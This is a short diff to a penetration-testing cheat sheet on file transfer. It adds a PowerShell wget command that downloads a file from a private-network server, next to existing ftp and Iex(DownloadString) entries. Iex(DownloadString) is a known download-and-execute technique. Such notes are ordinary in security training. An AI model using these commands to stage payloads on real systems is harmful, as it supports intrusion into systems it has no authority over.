@@ -11,6 +11,11 @@ ftp 10.0.2.12
 ```
 
 ## PowerShell
+wget
+```
+powershell wget "http://10.0.2.7:8080/test.txt" -outfile "test.txt"
+```
+
 Iex(DownloadString)
 ```
 Iex(DownloadString)
